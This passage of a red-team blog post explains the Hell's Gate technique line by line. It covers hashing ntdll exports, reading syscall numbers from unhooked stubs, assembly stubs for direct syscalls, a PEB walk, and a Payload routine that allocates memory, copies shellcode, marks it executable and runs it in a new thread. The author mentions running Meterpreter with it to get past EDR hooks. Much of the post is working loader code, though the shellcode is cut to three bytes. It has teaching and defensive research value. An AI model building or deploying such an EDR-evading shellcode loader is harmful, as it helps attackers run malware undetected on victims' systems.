<p>It then iterates through all the function names in the&nbsp;<code>AddressOfNames</code>&nbsp;array. For each name, it calculates the&nbsp;<code>djb2 hash</code>&nbsp;and compares it to the hash passed in the&nbsp;<code>VX_TABLE_ENTRY</code>&nbsp;structure. If the hashes match, it means that the function has been found. The absolut address of the function is then calculated by adding the base address from&nbsp;<code>ntdll.dll</code>&nbsp;to the&nbsp;<code>RVA</code>&nbsp;from the function. Then the absolute address is stored in the&nbsp;<code>pFunctionAddress</code>&nbsp;variable or in the&nbsp;<code>VX_TABLE_ENTRY</code>&nbsp;structure within the&nbsp;<code>pAddress</code>&nbsp;variable.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probably too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, &lt;syscall&gt;
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
					break;
				}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>In the second part of the <code>GetVxTableEntry</code> function, Hell's Gate uses the address of a native function to look for that function in the memory of <code>ntdll.dll</code>. It then looks for bytes <code>0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00</code> from the native function's syscall stub and compares them to certain values in the code. It starts at <code>0x4c</code> from the native function and compares byte by byte in the opcode sequence until it reaches the second <code>null byte</code>.</p>
<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-size:16px;font-style:normal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;background-color:rgb(251,252,254);"><img src="https://redops.at/assets/images/blog/opcode_comparison_x64dbg.png" alt=""></figure><p><br>If we look at the figure above, we can see that these values represent the opcode or bytes from an unhooked or clean syscall stub from a native function. If the comparison is correct or the native function is not hooked, the <code>SSN</code> will be extracted and stored in the corresponding <code>VxTableEntry</code> in <code>_VX_TABLE</code> in the form of the <code>wSystemCall</code> variable. This procedure is done for all four functions in <code>_VX_TABLE</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probably too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <figure class="image-center"><img src="https://redops.at/assets/images/blog/opcode_comparison_sys_ret_x64dbg.png" alt=""></figure><p><br></p>
<p>In an effort to avoid accidentally finding the wrong&nbsp;<code>System Service Number</code>&nbsp;(SSN) for another&nbsp;<code>system call</code>, the code uses two&nbsp;<code>if</code>&nbsp;statements at the start of the loop. These statements check for the&nbsp;<code>syscall</code>&nbsp;and&nbsp;<code>ret</code>&nbsp;instructions that mark the end of a&nbsp;<code>system call</code>. If the loop encounters these end-of-call instructions without finding the&nbsp;<code>opcode</code>&nbsp;sequence&nbsp;<code>0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00</code>&nbsp;it means that the correct&nbsp;<code>SSN</code>&nbsp;wasn't found and extracting the correct&nbsp;<code>SSN</code>&nbsp;will fail. This helps to keep the search accurate and in context.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <figure class="image-center"><img src="https://redops.at/assets/images/blog/opcode_comparison_x64dbg_sys_ID_2023-07-01-120230_raii.png" alt=""></figure><p><br></p>
<p>To finally extract the <code>SSN</code> from the <code>syscall</code> stub, the code reads the <code>5th</code> and <code>4th bytes</code> starting from&nbsp;<code>0x4c</code>. First the <code>high byte</code> (most significant byte (5th)) of the <code>syscall ID</code> is extracted, then the <code>low byte</code> (least significant byte (4th)). These <code>two bytes</code> are then combined to form the complete <code>syscall ID</code>.</p>
<p>While the data is stored in memory in little-endian format (low byte at the lower address and high byte at the higher address), the code reads the <code>high byte</code> first and the <code>low byte</code> second. However, it then correctly shifts the <code>high byte</code> 8 places to the left (<code>high &lt;&lt; 8</code>) and combines it with the <code>low byte</code> to construct the correct <code>16-bit syscall ID</code>, respecting the little-endian format.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>Payload</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL Payload(
	_In_ PVX_TABLE pVxTable
);</code></pre>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;
	char shellcode[] = "\xfc\x48\x83";

	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	HellsGate(pVxTable-&gt;NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &amp;lpAddress, 0, &amp;sDataSize, MEM_COMMIT, PAGE_READWRITE);

	// Write Memory
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable-&gt;NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &amp;lpAddress, &amp;sDataSize, PAGE_EXECUTE_READ, &amp;ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	status = HellDescent(&amp;hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	/*LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;*/
	HellsGate(pVxTable-&gt;NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, NULL);

	return TRUE;
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The <code>payload</code> function is nothing special, based on the external functions <code>HellsGate</code> and <code>HellsDescent</code>, it is simply responsible for executing the direct syscalls to allocate virtual memory, copy the shellcode into memory, execute it etc. In the context of running <code>meterpreter shellcode</code>, I was able to observe that it was necessary to comment out the <code>timeout</code> code part within the <code>NtWaitForSingleObject</code>. Otherwise the execution of the meterpreter shellcode failed.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>VxMoveMemory</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The purpose of the <code>VxMoveMemory</code> function is to copy a block of memory from one location (src) to another (dest). It is similar in purpose to the memcpy function in the standard C library, but has a custom implementation for this code. The function is used to copy the <code>shellcode</code> into memory. In my opinion, this function is not essential and could be replaced by <code>memcpy</code> or the native <code>NtWriteVirtualMemory</code> function.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();</code></pre>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">; Hell's Gate
; Dynamic system call invocation 
; 
; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)

.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	HellDescent PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	HellDescent ENDP
end</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>In addition, Hell's Gate defines two external functions called <code>HellsGate</code> and <code>HellDescent</code>, which will be used to prepare and execute direct system calls.</p>
<p>The first procedure, <code>HellsGate</code>, takes an argument (the system call number) in the <code>ecx</code> register. The instruction <code>mov wSystemCall, 000h</code> initialises the variable <code>wSystemCall</code> to zero, but the next instruction <code>mov wSystemCall, ecx</code> immediately overwrites it with the value in <code>ecx</code>. This procedure is used to store the system call number in the global variable <code>wSystemCall</code> for later use.</p>
<p>The second procedure, <code>HellDescent</code>, actually executes the system call. The syscall instruction in x64 Windows expects the system call number to be in the <code>eax</code> register and the parameters to the system call to be in <code>rcx</code>, <code>rdx</code>, <code>r8</code> and <code>r9</code>. This procedure first moves the contents of <code>rcx</code> to <code>r10</code> because the syscall instruction will overwrite the <code>rcx</code> register, and then loads the system call number (SSN) from <code>wSystemCall</code> into <code>eax</code>. Subsequently the <code>syscall</code> instruction is used to execute the syscall. </p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h4>Hell's Gate Main Function</h4>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">INT wmain() {
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject))
		return 0x1;

	Payload(&amp;Table);
	return 0x00;
}</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Last but not least, let us have a look at the <code>main function</code> and try to understand how it all fits together. Therefore we want to break down the main function in Hell's Gate.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>To get the <code>base address</code>&nbsp;from <code>ntdll.dll</code> without using the <code>GetModuleHandleA</code> API, we need to go through the <code>PEB</code>, but first we need to declare a pointer <code>pCurrentPeb</code> to the <code>TEB</code> structure from the current process.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Next, the pointer <code>pCurrentPeb</code> is declared, pointing to the <code>PEB</code>. Based on the pointer <code>pCurrentTeb</code> pointing to the <code>TEB</code>, the <code>PEB</code> structure can be accessed using the <code>-&gt;</code> operator.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
		return 0x1;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>In addition, Hell's Gate checks that the <code>PEB</code> and <code>TEB</code> have been successfully retrieved and that the major version of the operating system is <code>10</code>. This means Hell's Gate expects to be running on <code>Windows 10</code> (since the main version number for Windows 10 is <code>10</code>, or <code>0xA</code> in hex). If it's running on a different version of Windows, the function will exit immediately with a return code of <code>0x1</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>With the next line of code, Hell's Gate gets a pointer <code>PLDR_DATA_TABLE_ENTRY</code> to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data" target="_blank" rel="noreferrer noopener">LDR_DATA_TABLE_ENTRY</a> structure and holds the address of the second entry <code>ntdll.dll</code> within <code>LDR_DATA_TABLE_ENTRY</code> in the variable <code>pLdrDataEntry</code>. In my opinion this line of code is very important to understand the concept of going through <code>PEB</code> (PEB walk) to get the <code>base address</code> of a module, lets break down this line of code to get a better understanding. I will chunk the line of code and explain it step by step.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">pCurrentPeb-&gt;LoaderData</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>This accesses the <code>LoaderData</code> member of the <code>PEB</code> structure. The <code>LoaderData</code> member points to a <code>PEB_LDR_DATA</code> structure which contains information about the modules (DLLs) that have been loaded into the process.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data#:~:text=The-,LIST_ENTRY,-structure%20is%20defined" target="_blank" rel="noreferrer noopener">InMemoryOrderModuleList</a> member is a double-linked list containing <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data#:~:text=The-,LDR_DATA_TABLE_ENTRY,-structure%20is%20defined" target="_blank" rel="noreferrer noopener">LDR_DATA_TABLE_ENTRY</a> structures for each module, sorted in the order they were loaded into memory. The <code>Flink</code> member is a pointer to the next entry in the linked list. In this case it's pointing to the entry for the <code>main executable</code> module of the process. </p>
<p>Additional information: A <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data#:~:text=The-,LIST_ENTRY,-structure%20is%20defined" target="_blank" rel="noreferrer noopener">double linked list</a> is a type of linked list in which each node contains a reference to both the next node and the previous node in the sequence.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>By following the <code>Flink</code> member <strong>twice</strong> we now point to the <strong>second entry</strong> in the <code>InMemoryOrderModuleList</code>, which is usually the <code>ntdll.dll</code> module.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">(PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>This does pointer arithmetic to subtract <code>0x10</code> (16 in decimal) from the address of the <code>ntdll.dll</code> entry in the <code>InMemoryOrderModuleList</code>. This step is necessary because the <code>InMemoryOrderModuleList</code> is part of a larger structure (<code>LDR_DATA_TABLE_ENTRY</code>) and <code>Flink</code> is not the first member of that structure. So subtracting <code>0x10</code> gives us the start of the <code>LDR_DATA_TABLE_ENTRY</code> structure for <code>ntdll.dll</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">(PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10)</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Here we'll cast the resulting address to a <code>PLDR_DATA_TABLE_ENTRY</code> pointer. This gives us a pointer to the <code>LDR_DATA_TABLE_ENTRY</code> structure for <code>ntdll.dll</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10)</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Finally, we store this pointer in the <code>pLdrDataEntry</code> variable. After this line of code, <code>pLdrDataEntry</code> points to the <code>LDR_DATA_TABLE_ENTRY</code> structure for <code>ntdll.dll</code>. Based on this, we can access the base address of <code>ntdll.dll</code> in the next line of code.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>Now, we call the <code>GetImageExportDirectory</code> function to access the <code>EAT</code> from <code>ntdll.dll</code>.</p>
        </div>
    </div>
</section>
                            <section class="code-section bg-white">
    <div class="content blog-container">
        <div class="code-container">
            <div class="code-header">
                <strong class="name"></strong>
                <button type="button" class="copy-button">
                    Code kopieren
                </button>
            </div>
                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">VX_TABLE Table = { 0 };
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
		return 0x1;</code></pre>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <p>First, the initialisation <code>{ 0 }</code> sets all members of the <code>VX_TABLE</code> structure to zero. Representative for the other functions, the variable <code>dwHash</code> for the <code>VX_TABLE</code> entry <code>NtAllocateVirtualMemory</code> is set to the corresponding <code>djb2</code> hash. Next, the <code>GetVxTableEntry</code> function is called. Remember that this function is used to get the absolute address of the corresponding function (in this case for <code>NtAllocateVirtualMemory</code>) in the <code>ntdll.dll</code> memory. The <code>GetVxTableEntry</code> function is also responsible for doing the opcode comparison, extracting the <code>SSN</code> of the native function and storing it in the variable <code>wSystemCall</code> as long as the comparison was successful or the native function is not hooked. Then the <code>Payload</code> function is executed, which uses the externally declared <code>HellsGate</code> and <code>HellDescent</code> functions to execute the direct syscalls to&nbsp;allocate virtual memory, copy shellcode, etc.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-white">
    <div class="content blog-container">
        <div class="text">
            <h3>Summary</h3>
<p>In this blog post we took a closer look at the Hell's Gate code and saw how Hell's Gate exploits the execution of direct syscalls by dynamically retrieving the&nbsp;<code>SSNs</code>&nbsp;from&nbsp;<code>ntdll.dll</code>&nbsp;without using the&nbsp;<code>GetModuleHandleA</code>&nbsp;and&nbsp;<code>GetProcAddress</code>&nbsp;APIs. In general, the opcode comparison to extract the&nbsp;<code>SSNs</code>&nbsp;from&nbsp;<code>ntdll.dll</code>&nbsp;can still be used, but it is not recommended because if the EDR hooks any or all of the native functions used in the POC, Hell's Gate would fail. Therefore, Sektor7 created an evolution of Hell's Gate, which is called&nbsp;<a href="https://blog.sektor7.net/#!res/2021/halosgate.md" target="_blank" rel="noreferrer noopener">Halos Gate</a>.&nbsp;In comparison to Hell's Gate, Halos Gate can also be&nbsp;used to dynamically retrieve&nbsp;<code>SSNs</code>&nbsp;from&nbsp;<code>ntdll.dll</code>, even if the function is hooked by an EDR. In addition, the POC&nbsp;<a href="https://github.com/trickster0/TartarusGate" target="_blank" rel="noreferrer noopener">Tartarus Gate</a>&nbsp;uses the same concept as Halos Gate.</p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-red">
    <div class="content blog-container">
        <div class="text">
            <p>Happy Hacking!</p>
<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
        </div>
    </div>
</section>
                            <section class="blog-text-section bg-grey">
    <div class="content blog-container">
        <div class="text">
            <h3>References</h3>
<ul><li><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">https://vxug.fakedoma.in/paper...</a></li><li><a href="https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/">https://alice.climent-pommeret...</a></li><li><a href="https://maldevacademy.com/">https://maldevacademy.com</a></li><li><a href="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32">https://learn.microsoft.com/en...</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">https://learn.microsoft.com/en...</a></li><li><a href="https://resources.infosecinstitute.com/topic/the-export-directory/">https://resources.infosecinsti...</a></li></ul>
        </div>
    </div>
</section>
                    </div>
        <div class="blog-info container">
            <div class="updated">
                Last updated
                <span class="desktop">
                    31.03.24 13:18:44
                </span>
                <span class="mobile">
                    31.03.24
                </span>
            </div>
            <div class="author">
                Daniel Feichter
            </div>
        </div>
        <div class="further-reading container">
                                        <div class="heading">
                    Posts about related Topics
                </div>
                        <ul class="blog-list">
                                    <li class="list-item">
                        <a href="https://redops.at/en/blog/edr-analysis-a-hypothesis-about-call-stack-analysis-and-enhanced-detection" class="blog-link">
    <div class="tag">
        Reversing
    </div>
    <div class="post-date">
        2024-05-06
    </div>
    <div class="blog-title">
        EDR Analysis: A Hypothesis about Call Stack Analysis and Enhanced Detection
    </div>
    <div class="author">
        Daniel Feichter
    </div>
</a>
                    </li>
                                    <li class="list-item">
                        <a href="https://redops.at/en/blog/edr-analysis-leveraging-fake-dlls-guard-pages-and-veh-for-enhanced-detection" class="blog-link">
    <div class="tag">
        Reversing
    </div>
    <div class="post-date">
        2024-05-05
    </div>
    <div class="blog-title">
        EDR Analysis: Leveraging Fake DLLs, Guard Pages, and VEH for Enhanced Detection
    </div>
    <div class="author">
        Daniel Feichter
    </div>
</a>
                    </li>
                                    <li class="list-item">
                        <a href="https://redops.at/en/blog/shellcode-execution-via-asynchronous-procedure-calls" class="blog-link">
    <div class="tag">
        Malware Development
    </div>
    <div class="post-date">
        2024-03-14
    </div>
    <div class="blog-title">
        Shellcode Execution via Asynchronous Procedure Calls
    </div>
    <div class="author">
        Daniel Feichter
    </div>
</a>
                    </li>
                                    <li class="list-item">
                        <a href="https://redops.at/en/blog/malware-development-workshop" class="blog-link">
    <div class="tag">
        Workshop
    </div>
